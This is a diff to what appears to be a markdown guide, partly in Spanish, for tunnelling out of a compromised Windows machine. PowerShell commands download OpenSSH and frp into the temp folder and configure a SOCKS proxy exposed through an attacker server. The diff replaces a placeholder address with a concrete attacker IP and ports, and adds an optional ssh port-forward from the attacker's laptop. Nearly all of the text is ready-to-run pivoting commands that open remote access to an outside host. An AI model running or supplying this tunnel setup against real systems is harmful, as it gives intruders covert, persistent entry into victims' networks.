@@ -12,7 +12,7 @@
 ```powershell
 cd $env:TEMP
 rm -r -fo .\OpenSSH-Win32\
-curl "https://github.com/PowerShell/Win32-OpenSSH/releases/download/V8.6.0.0p1-Beta/OpenSSH-Win32.zip" -o openssh.zip
+curl "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v8.9.1.0p1-Beta/OpenSSH-Win32.zip" -o openssh.zip
 Expand-Archive -LiteralPath openssh.zip -DestinationPath .
 cd .\OpenSSH-Win32\
 .\ssh-keygen -f id_rsa -N """"
@@ -33,25 +33,26 @@ cd .\OpenSSH-Win32\
 2) setting frp
 
 ```powershell
+$attackerServerIp = "3.142.49.137" 
+$attackerPort2Socks = 9050
+$frpServerPort = 7000
 $socksPort = 5555
-$attackerServerIp = "1.2.3.4"
-$attackerExposePort = 9150
 cd $env:TEMP
-curl "https://github.com/fatedier/frp/releases/download/v0.37.1/frp_0.37.1_windows_amd64.zip" -o frp.zip
+curl "https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_windows_386.zip" -o frp.zip
 Expand-Archive -LiteralPath frp.zip -DestinationPath .
-cd frp_0.37.1_windows_amd64
+cd frp_0.42.0_windows_386
 Clear-Content frpc.ini
 Add-Content frpc.ini "[common]"
 Add-Content frpc.ini "server_addr = $attackerServerIp"
-Add-Content frpc.ini "server_port = 7000"
+Add-Content frpc.ini "server_port = $frpServerPort"
 Add-Content frpc.ini "[ssh_socks]"
 Add-Content frpc.ini "type = tcp"
 Add-Content frpc.ini "local_ip = 127.0.0.1"
 Add-Content frpc.ini "local_port = $socksPort"
-Add-Content frpc.ini "remote_port = $attackerExposePort"
+Add-Content frpc.ini "remote_port = $attackerPort2Socks"
 .\frpc -c .\frpc.ini
 ```
 
 ## (opcional) attacker_laptop
 
-1) ssh -L localSocksPort:attackerServerIp:attackerExposePort user@attackerServerIp
+1) ssh -L localSocksPort:127.0.0.1:attackerPort2Socks user@attackerServerIp
